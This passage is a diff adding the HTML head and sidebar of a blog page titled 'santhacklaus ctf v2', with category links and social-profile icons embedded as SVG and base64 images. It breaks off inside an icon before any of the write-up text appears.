@@ -1,0 +1,1583 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      santhacklaus ctf v2 &middot; Adel ALLAM
+    
+  </title>
+
+  
+  <link rel="canonical" href="http://localhost:4000/linux/2019/12/23/ctf-santhacklaus/">
+  
+
+  <link rel="stylesheet" href="http://localhost:4000/public/css/poole.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/syntax.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/lanyon.css">
+
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/public/apple-touch-icon-precomposed.png">
+  <link rel="shortcut icon" href="http://localhost:4000/public/favicon.ico">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
+</head>
+
+
+  <body>
+
+    <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular
+     styles, `#sidebar-checkbox` for behavior. -->
+<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox" checked>
+
+<!-- Toggleable sidebar -->
+<div class="sidebar" id="sidebar">
+  <div style="font-size: 2em;" class="sidebar-item">
+    <p>Blog-notes</p>
+  </div>
+
+  <hr class="sidebar-separator">
+
+  <nav class="sidebar-nav">
+    <a class="sidebar-nav-item" href="http://localhost:4000/">home</a>
+
+    <!-- categories links -->
+    
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+      
+        
+          
+            <a class="sidebar-nav-item-sub sidebar-nav-item" href="http://localhost:4000/category/ctf/">> ctf</a>
+          
+        
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item-sub sidebar-nav-item" href="http://localhost:4000/category/linux/">> linux</a>
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item-sub sidebar-nav-item" href="http://localhost:4000/category/network/">> network</a>
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item-sub sidebar-nav-item" href="http://localhost:4000/category/other/">> other</a>
+          
+        
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item-sub sidebar-nav-item" href="http://localhost:4000/category/reverse/">> reverse</a>
+          
+        
+      
+
+    
+    
+      
+        
+          
+        
+      
+    
+      
+    
+      
+        
+          
+        
+      
+    
+      
+        
+          
+        
+      
+    
+      
+        
+          
+        
+      
+    
+      
+        
+          
+        
+      
+    
+      
+        
+          
+        
+      
+    
+      
+        
+          
+        
+      
+    
+      
+        
+          
+            <a class="sidebar-nav-item" href="http://localhost:4000/privacy/">privacy</a>
+          
+        
+      
+    
+      
+        
+          
+            <a class="sidebar-nav-item" href="http://localhost:4000/about/">about</a>
+          
+        
+      
+    
+
+  </nav>
+
+
+    <hr class="sidebar-separator">
+
+    <div id="sidebar-icon-links">
+    
+  <a class="icon" title="Root-Me profil" aria-label="Root-Me profil" href="https://www.root-me.org/apges01" target="_blank">
+    <?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="32px" height="32px" viewBox="0 0 32 32" enable-background="new 0 0 32 32" xml:space="preserve">  <image id="image0" width="32" height="32" x="0" y="0"
+    href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAQAAADZc7J/AAAABGdBTUEAALGPC/xhBQAAACBjSFJN
+AAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElN
+RQfjCwkWHxp+T5UxAAADEklEQVRIx82UX0jdZRjHP7/D4XA4/BCRwyGGmIwlIhLDi00kLGLIGiEx
+TCZBFzFG0P6ErCatEUO8iBhD1vAiYsgay5YXMqitM5HlRvRnKY5FFI0Fbph4YSZrk9P5dHGOZ3b8
+qUE3PVfv+z7f5/u83/d53gf+owXrOX2ZBJfYwxfB1FqY+BqhGbaxnQbmuc8sQ55mkslg8V8SuItD
+3CNLnhiT9HGCHMe474FgekNNpn3Xc9YBWONW8MOiZ4e/ud/YRgRn7LeiIMNRbxovEVR6w8/ds44E
+U3QzzQAZF+kmwSkagpxYxSBJLnKJ4wybDz5ZK/tTZg3tc9S99pk2YQIc9G0HPO+YW8BWsyaiw2MO
+2Qa+Ym9RxLB3C5pNO+CZIq7XV6MJHnPUNIBxMAbuN1skqHXCpuUSe7mAK3+DncxSbTUQ8yhVvhi8
+b4KQBRvp50DwfQEWzJqjnmuF3cqiPM1waT3BFEvAx3RaTT8XgmsrkD+QZrV5wQSYBKtKZ3FH/crm
+MuSInZFlJG8zh7zDHz7gCj8R8gYLHAm++0d4nBbORRE8oJ5NhJwPpsAORpjjbHCkLHuS18mxFCXh
+oIeNmzFuyt1m7bfOVX/FNsfN+kwUQY1j1triXq87WOiE8uzu8KrtZt20fLZiHljBt/xIkst8xu0g
+4pJ208VptpOmK8itfoMUX5LnNfJkyJWFxmnjKC18xDRV5EixsLoPZvmFu0EO2Mo71j3qeBs5wVla
+AJjiOT4IFiKqEOS9TSUEee/Z/vuzDxv//DQ5zhIv8fyKNIssMfNoGz3SZoK5uVM3U03vPR6ywM4V
+njusZ3a6r7jabNZxT5oxbo9/qQ+9YYcxU140sxZBh0Mmi+tKN5kEK03Y688edjOADU6YXosgaY9Z
+S4qN2+4tt5X2lXb6tbvWExHzBcc8WLiHFb7lPtuLvtAhR6zbeKwmvG5r6Q5PLrezb3pydWtHsAVL
+zIC1HgdCjhFaZw8Avwa5cnR0GZM0Uc9urxKyhVZq6PIbnuBWRLpIEX00kydknhghi8QImSdFb3CF
+/539DagplOU/gNJHAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA1LTA3VDE5OjAzOjA2KzAyOjAw
+95u+EQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0xMS0wOVQyMTozMToyNiswMTowMBkgVUYAAAAA
+SUVORK5CYII=" />
+</svg>
+
+  </a>
+  
+
+
+  <a class="icon" title="Github profil" aria-label="Github profil" href="https://github.com/AdelAlm" target="_blank">
+    <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 28"><path d="M12 2c6.625 0 12 5.375 12 12 0 5.297-3.437 9.797-8.203 11.391-0.609 0.109-0.828-0.266-0.828-0.578 0-0.391 0.016-1.687 0.016-3.297 0-1.125-0.375-1.844-0.812-2.219 2.672-0.297 5.484-1.313 5.484-5.922 0-1.313-0.469-2.375-1.234-3.219 0.125-0.313 0.531-1.531-0.125-3.187-1-0.313-3.297 1.234-3.297 1.234-0.953-0.266-1.984-0.406-3-0.406s-2.047 0.141-3 0.406c0 0-2.297-1.547-3.297-1.234-0.656 1.656-0.25 2.875-0.125 3.187-0.766 0.844-1.234 1.906-1.234 3.219 0 4.594 2.797 5.625 5.469 5.922-0.344 0.313-0.656 0.844-0.766 1.609-0.688 0.313-2.438 0.844-3.484-1-0.656-1.141-1.844-1.234-1.844-1.234-1.172-0.016-0.078 0.734-0.078 0.734 0.781 0.359 1.328 1.75 1.328 1.75 0.703 2.141 4.047 1.422 4.047 1.422 0 1 0.016 1.937 0.016 2.234 0 0.313-0.219 0.688-0.828 0.578-4.766-1.594-8.203-6.094-8.203-11.391 0-6.625 5.375-12 12-12zM4.547 19.234c0.031-0.063-0.016-0.141-0.109-0.187-0.094-0.031-0.172-0.016-0.203 0.031-0.031 0.063 0.016 0.141 0.109 0.187 0.078 0.047 0.172 0.031 0.203-0.031zM5.031 19.766c0.063-0.047 0.047-0.156-0.031-0.25-0.078-0.078-0.187-0.109-0.25-0.047-0.063 0.047-0.047 0.156 0.031 0.25 0.078 0.078 0.187 0.109 0.25 0.047zM5.5 20.469c0.078-0.063 0.078-0.187 0-0.297-0.063-0.109-0.187-0.156-0.266-0.094-0.078 0.047-0.078 0.172 0 0.281s0.203 0.156 0.266 0.109zM6.156 21.125c0.063-0.063 0.031-0.203-0.063-0.297-0.109-0.109-0.25-0.125-0.313-0.047-0.078 0.063-0.047 0.203 0.063 0.297 0.109 0.109 0.25 0.125 0.313 0.047zM7.047 21.516c0.031-0.094-0.063-0.203-0.203-0.25-0.125-0.031-0.266 0.016-0.297 0.109s0.063 0.203 0.203 0.234c0.125 0.047 0.266 0 0.297-0.094zM8.031 21.594c0-0.109-0.125-0.187-0.266-0.172-0.141 0-0.25 0.078-0.25 0.172 0 0.109 0.109 0.187 0.266 0.172 0.141 0 0.25-0.078 0.25-0.172zM8.937 21.438c-0.016-0.094-0.141-0.156-0.281-0.141-0.141 0.031-0.234 0.125-0.219 0.234 0.016 0.094 0.141 0.156 0.281 0.125s0.234-0.125 0.219-0.219z"></path>
+</svg>
+
+  </a>
+
+
+
+  <a class="icon" title="Linkedin profil" aria-label="Linkedin profil" href="https://www.linkedin.com/in/adel-allam/" target="_blank">
+    <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 width="430.117px" height="430.118px" viewBox="0 0 430.117 430.118" style="enable-background:new 0 0 430.117 430.118;"
+	 xml:space="preserve">
+<g>
+	<path id="LinkedIn__x28_alt_x29_" d="M398.355,0H31.782C14.229,0,0.002,13.793,0.002,30.817v368.471
+		c0,17.025,14.232,30.83,31.78,30.83h366.573c17.549,0,31.76-13.814,31.76-30.83V30.817C430.115,13.798,415.904,0,398.355,0z
+		 M130.4,360.038H65.413V165.845H130.4V360.038z M97.913,139.315h-0.437c-21.793,0-35.92-14.904-35.92-33.563
+		c0-19.035,14.542-33.535,36.767-33.535c22.227,0,35.899,14.496,36.331,33.535C134.654,124.415,120.555,139.315,97.913,139.315z
+		 M364.659,360.038h-64.966V256.138c0-26.107-9.413-43.921-32.907-43.921c-17.973,0-28.642,12.018-33.327,23.621
+		c-1.736,4.144-2.166,9.94-2.166,15.728v108.468h-64.954c0,0,0.85-175.979,0-194.192h64.964v27.531
+		c8.624-13.229,24.035-32.1,58.534-32.1c42.76,0,74.822,27.739,74.822,87.414V360.038z M230.883,193.99
+		c0.111-0.182,0.266-0.401,0.42-0.614v0.614H230.883z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+  </a>
+
+
+
+  <a class="icon" title="Twitter profil" aria-label="Twitter profil" href="https://twitter.com/apges01" target="_blank">
+    <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 width="510px" height="510px" viewBox="0 0 510 510" style="enable-background:new 0 0 510 510;" xml:space="preserve">
+<g>
+	<g id="post-twitter">
+		<path d="M459,0H51C22.95,0,0,22.95,0,51v408c0,28.05,22.95,51,51,51h408c28.05,0,51-22.95,51-51V51C510,22.95,487.05,0,459,0z
+			 M400.35,186.15c-2.55,117.3-76.5,198.9-188.7,204C165.75,392.7,132.6,377.4,102,359.55c33.15,5.101,76.5-7.649,99.45-28.05
+			c-33.15-2.55-53.55-20.4-63.75-48.45c10.2,2.55,20.4,0,28.05,0c-30.6-10.2-51-28.05-53.55-68.85c7.65,5.1,17.85,7.65,28.05,7.65
+			c-22.95-12.75-38.25-61.2-20.4-91.8c33.15,35.7,73.95,66.3,140.25,71.4c-17.85-71.4,79.051-109.65,117.301-61.2
+			c17.85-2.55,30.6-10.2,43.35-15.3c-5.1,17.85-15.3,28.05-28.05,38.25c12.75-2.55,25.5-5.1,35.7-10.2
+			C425.85,165.75,413.1,175.95,400.35,186.15z"/>
+	</g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+  </a>
+
+
+
+  <a class="icon" title="Cryptis" aria-label="Cryptis" href="http://teamcryptis.fr/" target="_blank">
+    <?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="467px" height="484px" viewBox="0 0 467 484" enable-background="new 0 0 467 484" xml:space="preserve">  <image id="image0" width="467" height="484" x="0" y="0"
+    xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAdMAAAHkCAMAAABSXzWKAAAABGdBTUEAALGPC/xhBQAAACBjSFJN
+AAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAY1BMVEUAAAD/////////////
+///////////////////////////////////////////////7x3j8x3j7x3j7yHf8x3j8yHf/x3j8
+x3j8x3j9xnn9yHf8yHf8xnn/v4D6xXr////8x3jKFOSNAAAAH3RSTlMAIEBwgI+/799QEK8wn89g
+QGCAj7+vIN+fcM/vUBAwb4xV9gAAAAFiS0dEAf8CLd4AAAAHdElNRQfjDB8AOw3TjfrBAAAfs0lE
+QVR42u1d62KyuhJVRPAOtfZi+1n7/k/5qa2FQICZyYRMYtavs/c+VsNiJmsumUwmERERERERERER
+EREREREREREREREREREREREREREREREREREREREREREREREREREREQFhmiSzNJ1nF+TnNhbX/5Cm
+6TJJVq5/akQ/VsnySuQZhUW2TtNk4/q3RzSxWaZbJJdtbudpMnW9kIjJ1TbT9c6MTQXZfJa4XtMD
+40rngpHOCrvtLDrj0TEttpzWqbXYdBkV1Fi48GnHPDUGO4+8WsdqPD4rXuMGaw+b1La/7UC+LqIi
+toDlNjcnx8Rc0yibOLEq1k75/MViHmnlgRBCI61sWG5d09imNe6tBtjM3e6hXdjNYoRDwmrmSOWC
+sF26fj7+IRHnc5tYpNEHI7CajZ1YoGEbsxFATB1HohgsirizDiMxrIOOjTy64AEUfjhdFdvIaidW
+qY+MXpHFjVWLVerPNhpZhcBvRiOrbfjPaGRVRRiMRlZrSHxVRlpWY93mgtQ1DcyIkc1EfF4Xj/TB
+c0sBUno+5zPXj9UlQnO8d+weVywlrp+9PawfdFtdhaR4m8hT14/XCUL1vL94RAe8CiXV0In5wyng
+wM30ivzR2pZC3k3/sH4oU924ftzj4KFMdeb6aY+FBzLVIFNIWjyOqXrWTGaERxHAdp/iLsvmaTpL
+brh/5eb2T0Waphl25o7pz3mMGpyVZ5dn6wuRwAc4vQ1UGkl+P0Ren/mZLbK0IM4l2yx5B/Lo8QhS
+iZHOdcowZS6ZWZ7lsgjf//I8QOaRN0m6tpixDN7/mouULLWSJd/MrPEauv81S/cu5laDvs3Mji4O
+XP8uDV732QgV55WVUS+B5x+IT2w94vnAzZw/0gm6Vk5JDo5J6A/4aQ15U0V3I2WOTvAmzE54F3Cv
+EkqGuJ2fwDukKQ9XKSEqqO5HJ0w5T8fmhevlWMMcaqJ4n7up7jnIsp/0xuLnH+ZpmiakCfhLRmMN
+l1RILilDLR9xz8HuQu8SZ/9TvilcW9fP3haGWwe3YINKipRUY1lk8wLOLN+cn2BJ3fSSmgMPiTGk
+33db8OUGBVOqfxdqTLPpfkA5ZBtdLed8WTzorHSmgT/BkrrqEB4QRpdz/uoYjFceVoMldbLU7FDD
+jNrKst+eNWCoNgurAQeqzVFXg4wmFvKwKhbDkz85WA2Y1Mkm/XtAu6GnOdZo/HyQVoaxayGTOrld
+hzicC9iMOmFykNaZ8a8JnNRBsObnoM+8fwT+CpgLi6RqUbjq8t711oOmpj/rYUllzMpRHntvOmtp
+6D0ek9Sl+4MYu56088rwKO3jkboSMtW3L8LamCU/HoxUSdMI+/LPZgp4EWxGqY2pIEZv6GbVTCuF
+myZsPiaJZ1S7WTUy1ccg1Tz0G5vVqcmumrl+3iMwKs3rglg1EcDBFsnvME+62UWXBt4YaPS564du
+FaZR/AjoGv65MmhEC7fxbLJxn2GAYNHR7FLQXUyoh2nESqM2Mv22Sve/geYeDN5yB9AfaKL73xBz
+D8ZFjrHR4YDJ+nfnmgF2+DhWcqs1rSXV3QQW0Rgmwl1Bf0yYvJigdJKPRvoD7YnSFXEbycPZUj01
+0l8etMZFzFYHk3rwfUqodqIgcVFhGCrVTwmCdqJKQfpTQUx8SLyKSbugSxZuKCtbuOaDAf6KIxU6
+qUQi1ft5DwH43Tt0EwUpiULfc/mkF1ksNGys8ILec+VbuGaBGZo0EJ5Uv1seJDYcmUHTV4Qm1WdO
+CW5JPjT1Muw6PebUpM9DMDTDj5Ck+sup9ah0kWXb9DYN6Rez9DYyybp3aEeqOFK95bSwyOU8Tfqn
+qCSJ1dsN2koJRaqvnNpJNCBG4tyonTFObVFIbSklDKmeJgf5BW++RtFZYTNb81tsW/4irgb1M+fA
+TOmFT7PurGnBPQO/TSo8u+JjbpA3HbiY8wwN3fBOW2pP6YWS6mNPEmdYujM0UBXTGeNPaweqwCnU
+HrpePkptzGlmpLVNagH6mH81cS5Kc2tzmjdcsyPapELUvn+ql4nSnd3Z+EwzXtqkDotD/9q2eSgd
+YZT6lGW4VpvUwfU7nxKPBQel+Ui3Haw4Jmy1SF0N/FH/PK85paCpvlxgmPjSilP7Ixr/2vCNUw2j
+MnqFOasoUh+P0tEZvcKY1Tapnd7KP8dreLDUCaNXmM4hWDf/YMcR29w7eWRaXAPed2ADprPn2h5V
+N8/Z1StrAIO7MS/I3L7DU7PrgjQ+NVH/IuVeJOcw6vlE3oVVlk/7/fNBwct+vy/LV/LvT4y2Vd3v
+v165cXsouzVg/r5AIKqHbWyh7/CFy5fDdy/eDu97GrVGDthL0vphkmtYgNxueXz/+Abj8/D8D02s
+yWAC/zJ+gzCIYubDT6PcH+B01kz2/QnJq4EC9ry3XvMs7Bnp69PLJ4XQO6/P/zALMTBVH5sXeoC+
+kfgPAzvp6xHhbzv98DuGVvKu6l+KqA9TqsfKe+dVnJ4YCL3TWoJXQ+40D8pQqfqo997t8p2L0F8n
+fDwBl0OdaDUD/n0fQE0J9qiK09MbL6M3vH8BV0STB752YmtAzB/1pBlOexNV1IcDcGelJVBcM8EG
+4ma66AzSX5mdbsMFP4FWRYq3/UvRd4C2mXZOh7fLKIJVQsQdyoQymvTv0v32vG4dHyVkZfhN1b/q
+qBa0yLRr8ccxGL3iAMkvFY/J6VBDlR4d6qhkC0cBeAZENlilFAanlDCmQ/CerG+kKj4BEhhJahCc
+Ujxvx/jwf2O53QoAB4y7UCYE3UvxvHpKT6S6i7GpHoeXiCE1hBoqwfPqKXVgpL+mOrirYkh1zQcD
+CJ5XS+nYO6liqoO7KpzUEHKD+GyDltIvG6ldOJ7ZSA0gh4/PNmgpfXLK6AUfQ1IJSqr/3Sv4PK+O
+Upd+947PcohU0FIDqInji4yadOhpzDRDN4b0LyhO9b8kjhdImlTDlyu928S7OakB9JihQ1ONgniS
+QullUx0IagaLxAH0gqKLFprdxrk6UkgdUEpF//ICuFwP3XWvid0EqKM6PgcaW/rrqR6Ox2kCm0HS
+lMCFUWpGagCUTpGUajyTOEqHY5rO/SYPocEB29fRXrNASi8Y6GrpOPqW+R/F4M20XVeUSen390D2
+d5W2dQTymKVUIM+UtPWRVEqHttT2/B3Lo7lGAzLd0B6v5y+lV2zS3wHeu/UsBK97A9JMW9V/vykN
+EkgzbeXMIqXygDPT1vzho2vuIqUtIEVvMzIVlRCMlP4AF5s2w5gv19xFStvAmWnT84oprkVKa8Bl
+ehueV0gJPFKqAFeQaXreF9fkRUo1QNVNm/dm712TFynVAdXe0Mg2lK7Ji5TqgDrn3xiBepKpj/SU
+bmbb7IptGsIhmF5gmgXzRjLUyZEYEqUb5foDe3eiiAAqkGkIJPb80dvhsP/D+4H2ymgo3bQTZY4H
+0VoFpvW+UY7hTDa8vegnf5ZPz0hm25R2jMheh1FS0wCjkBqlYq7IdHAuJGbeZJvSzlH2C/8bA7XA
+KKRGHMMTxrw9gzTq6QkWCGso7Q6/A+lnaAKjkNQn8MrBKGJm4OR0HD4th6L0HM6onDpWCEobiV5z
+zfu5h44LvKMcMNY2pQPHugLoy26hQHCqCkXjAhtwTlUDvfOzNIp36ExiAOcnsEvuNFPTbAPeRu94
+7XQQGkqHVb0n55ymxTzL8vMuG7xbAROcqrvpsxmlkFFGnSj1+6qGUsiBWh96ygrF9vLea3sQ6XtV
+9JoJJNgguR7oJLcuewQp9ssf2VC038yennKE61XN1KjCtjdf5lcrNtZRCqsiCk8odYTXXcO4EK43
+Vz5YGjD6xlMzaZiqNm1fgJYm21A719AxhhXhetXXwiCOeTHZSeso6ypNX4kBBt+S45meHhR9GgzR
+Aqq8FAZmOjxmDIzXjwFKJ8C1CZ7E0dtWlGs2VUTCQV022UwhQx7h+Bvw0kEpuBNdrPQt+n+3xv0W
+kPX+QNERZDNlbz947/2z4PVJNdQN/ofD23rVQIZqpoOTqPB46ntTwGXEXGgyaTgsaeWr4f2CyoAV
+amw6NAeFhKce44eXhmWOoAP4mWbL36BlV1DeY+KBJyuUTib/uv05nNMF4gvHA6S03agWwpesdJad
+RFHaB0QLh8SaG8BMW28jPJJRXgZaE9Ln+JRiOF2bfxs7YNG1GqSCF6zmkEhjXJ003GJO1cpTScBI
+U6krwVesKOaSZKali6eCqTrJU0nAriKlBAr3TMpmQ1JIpPK3ORD9czvzb2MGlJ/6Z8DbqeJ6SbXw
+oRGdtoA5VysulwTlp54OAq9W0Q+UlpUPV48FEa3J63eA1kFrnMLXq6heQuH0kz99BAXC+YoLUaE/
+vMYpvM5Wl4SU4JSxFINFgTBUYRU3sM3VOAXvNYp6ILjeg8sngzBUYcoXHJbUOAW3rSjVcLzqdeh5
+JyhDFaZ8wWFJjVPwWpUyG171MjQfmQBhqLLSDuAhG9XPhmcc6l+EP8n25vjRIAxV1uEZaChTizTB
+EknpwMIfeypdPxu4ocqqjEP3xho/YImkbKfoajhNIH0d94fD4fnIkST2teBGeBPBWSRlOx3DTF/3
+VZXg89lYYSGarkRFMwSbAy+0/j2lfTM9Nd270SmMK+AJQknRDFjvVMl4cMlCUfjo7RTdJtjurzfu
+8Yafmpa0oRLCU/BHlDQodjtFi17t7MJPw6oOWCVJ2lDBGpbwEUXgY6NTbFawaxxlafR44OMUBUWo
+YGlH+EhdIqEbBpFbYWcdzywXBa9WCDoNBSWotjeCZW/9e/4hKcWWTbtrPmY5Y7DzTY2+hhVQgjL8
+R4wkElIhlT1/ymhLBStfQZ1mUIJquo60SmTt9BO5jD4FZpRiBCtfQSIJyikhPFW8EXLG1QtuFf27
+tUlAA087uGbShCBwKKPIXqTrRfrLfs/+bPKAwHVFOSIJ/4spBVe07EWK1f7g16inCRzNyCnN4Akq
+oB+pR2wljlIsCwPBr8kDAm+oYoQveLuoOCVEtOi+FWwkw2v1tCckRviCHWlldISIFh3KYMOPgT9X
+mjwiaIQqZlwHmNPqI9DJkcoakWOusErVJqeEpgHvOCVEtOgMPnYZA3/OqORG2mtcwiKnBk0OaKFq
+USPRNKFLQDmtZUmgAZtBygGdorUYy9BiN5eA1s1qmyN0iQYpB3QPaP9ZZaOcAyU0cAvoZkHg1KAZ
+Cc2pvdwgYsFSZgDI5BQ/3arP+Zoe0ICOmJGSdJDJaYleR8n611SQRKFDWOS03h2JPNJGYKE7AEaW
+eNqInP6h/jUlnE/iBth5lar50JbwOSVEtGhOKSvp6DFjGNoCrcxETrk57egFZThiAX1GUpL4AXE6
+ObXFL8vkScL+5BQhcTqZHFVT/eQ5vxo5dclpo5ONaXJA5JSDU/ImeIicjsYpsh2ppC7HKadSjkHh
+OQWfalO+x2dOoW3b/sYy4JyDUk70mVPfcg5QT1prLoJyOmZd5o7I6YS0O0ZOI6c34IYxk9PuVjiF
+LvjROMX1I5HJcMqplD4HAqfQErEytcJy36D+a3g4pQxkdApwZFL9YNL2gpw1SE3T2uDUux4zgmMh
+cYrsw6dezWaDU+/6ey1yqqTKkJeQUDv9bHAKPinujMMmoD+42h2ha1Q4LXGcUjtybXAKfYflHBTH
+d2BDfZGyRuxQUGLDiQ1OoW+9lBQ+/C2s5lfR9hckp8QN1QKnYNkrJYVP2R3Bh2yVGzqQN0ARbyCx
+wGkBXa6UlANld6Rpe2SASpyVYoFTsESS0oYP96TV6UpwSKskHbDzkWhlcQucgodeyZn2StgdoZ9Q
+RkjanmP2A35O4fe2uWRRBdiTVq8hNDmoCEGs8MUOvfoBP6fggZmCrq4g7I60w/BITmkT5fg5hU46
+ECR74b6lknVg1aB0OmDn95IIYecUPsZMjuyl7I6kWa/4OdsUlcTOaQHmVEwGf0IZFQNep/LqYkUS
+SSWxcwp2vYIkEiWdCd6CDa+HJxTcuDmFu15BEolUdoB+Qs1qIyeDkgxVdfBmcxyuKMCciroClbA7
+gsNwJTuIHHtF2lHViKk0fjjgoaCCJkhOEOnb6leDh6cr6TL0hkrxnS9mH28AcVexqOunCTeLgE1b
+dUhoTgnVmdpxcYaLNuFXBonaTin1wYK2UvzV02/4MurfIdQPhtPE0IyZsO0U8cP/PgF3SUrWgXBP
+MUXlPL18fn++GN4VdAP8FihBRZkbwLtjtWXQloq+Yubb8XWZ8AuDREWnmF9OEElqEhQdzZC8Lx/A
+yxQzyuEOcOWh2jPAr4EaoSKbB28wnm5kAPh2KiqSmSCEL6F9RS0U41NJ3/h72xgBXqWYMa93EG5Q
+gReK1WtB8cr323gCpAHAq5TmehFpIUImSY1mCMqXJc4kAsypNNeLkAKV0cHLFWp+BXth5g0frnQS
+eJHSXC8iLVS5GLCuajhffM7XJalQjSTP9cIVT9WMAs86qM6XEqJ+k7t9TQF1YMISDlfAFQ++z6zp
+fEkqyRqpX/0OABiyibmEpA4wQfiDUE3nW9I4tUPq12e/Vwc6MGG53h+ARVK1cRRgThvHvQi5pB9S
++ffU6yDRflJhL7uoMtsdYJFEiVAb/emkcOYKdqH0NPxnQd5Iznm2OsCZpFqECu8AaDS+Ig9D1Ujl
+jVOPgHcFJAUFKqQJJpNESPmeczV6Ixvq92fJuOZqwEQfqYBdSaaZIoyO0DzYyrKQDZUx9/ta39Z7
+SAVsMZL6euuAG12lB+DRTKOvg26o398vPJvqPzWf1UPqoNQQKXqvgNdZKNFM81WmSl8u/3tqZbN6
+SB3wvjt5acFfwFUspd7WVEmlAaff38+mplpqnH83qavefSkXSymizlJLV8M5bUZwxGTS3VSNWo1O
++ulbNFJzOeeI24BvqJXggddmmpsOMev7h0NJZnTfVRnqIbXT/cp1vFfAHSklldRyUegzbkysPvVo
+brxQEiuPfgCPUGvOF658m4czTwbxDJnV077/W/tCGo2pZlKDmD9QDoYglG/TUEtjTi8cPGHU0tf7
+YD2+L/mQNBa7Fs8oJuVLUr6tU9RmMumOd+Dhi9cjKH7qzf2ulvNfa822heiN9A5EWqgSsXC13DLU
+E6mLpY3Pl6ehNHD5DA6InXXJ2AF8c6zSDog+9Zah4k+5deLt/VjqyXj9t8eNkQiLVPjmWOV8EQW3
+dnROa03qNtjD+37/r7zjuN8fKPmqoEgt4PRUgTZcWbVnzTBoXxsIiVRENFOxg3gR2u0A2ClYkVQ0
+4Ad+Kje6QoSo7UIj5fhMJBUDeMtuLUTFqKR2pRF58UEkFQuE4NlRPqQZLn4yqbpFUgFACJ5KJcE9
+9lkzvu2LKUqNpHYA4XwrlYTIVZw1XZOla/YCJxXjR6tgE5FL0vVjmTSyRFKHgXC+lRctUIY6a32p
+UJ0UCqkI51uTO5hwRtfrEUm1CYzzrcIZeEXnCs2xPqHiNxBSESK2MlRU3kHnfaVGNGGQWiC4qRII
+OEPN2yeGIqkWgTG5jPSps3YyXyTVIhDdKGRD1Q2OF0uqw0E+XMBkEMiGqjthIpRURzMHeIHJIJAN
+VbOlyiSVYw6le2DYoRuqbtitQFLDoBRXZyEbqvZ+HXGkBkIp6sBEPXuLyvqeOwZ/icoosR5gdgtU
+naUy1ALJqf4SQua2MyNK3U055AfG4mr7IqqOeu46ESamShNCYFoBkcivu1BcHfXcdSaslFEktzC4
+xyVQGrZWnsGkK5pGXsOrBKW0d00CN1DkVDmhKTKe6bpc8uRcKQWkjv7IwfBSq4di45nOG0Of3Ppf
+5jFMMoAJZ+q8YOOZTlK/XPrf4PzuDTi5kxA/d0PHfOqTs6DmrXT99C0BcwqmnnhAy6TuoeOlm8M0
+gendGgoULVXjAjbt20eqC1MN1kivQO2MNZmEOTg+ROr4pmo8eEk0cIZaUzooefWL7ukl+zEF8CGk
+ZKAOOAlbySSK9+1Svxe8jharms3R8gI4Q12Yed8eUicl7ug+ldF90G73FzhDrblPivc9Zz1jTEZg
